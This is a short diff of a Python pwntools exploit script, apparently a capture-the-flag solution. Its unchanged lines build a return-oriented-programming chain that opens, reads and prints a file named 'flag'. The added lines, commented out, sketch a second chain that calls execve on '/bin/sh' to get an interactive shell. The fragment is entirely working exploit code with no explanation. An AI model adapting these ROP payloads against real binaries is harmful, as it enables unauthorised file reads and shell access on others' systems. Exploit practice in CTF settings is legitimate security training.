@@ -49,6 +49,12 @@ orw_payload=b'flag\x00'.ljust(0x20,b'\x00')+p64(bss)
 orw_payload+=flat([p_rdi,name_addr,p_rsi,0,open_addr])
 orw_payload+=flat([p_rdi,3,p_rsi,name_addr+0x200,p_rdx_rbx,0x30,0x30,read_addr])
 orw_payload+=flat([p_rdi,1,p_rsi,name_addr+0x200,p_rdx_rbx,0x30,0x30,write_addr])
+
+# #p64(pop_rsp) + p64(rsp) + p64(jmp_rsp)*2 
+# payload = '/bin/sh\x00' + 'AAAAAAAA' + 'A'*24 + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0)*2 + p64(syscall)
+# p.sendline(payload)
+# p.interactive()
+
 stack(orw_payload)
 p.interactive()
 
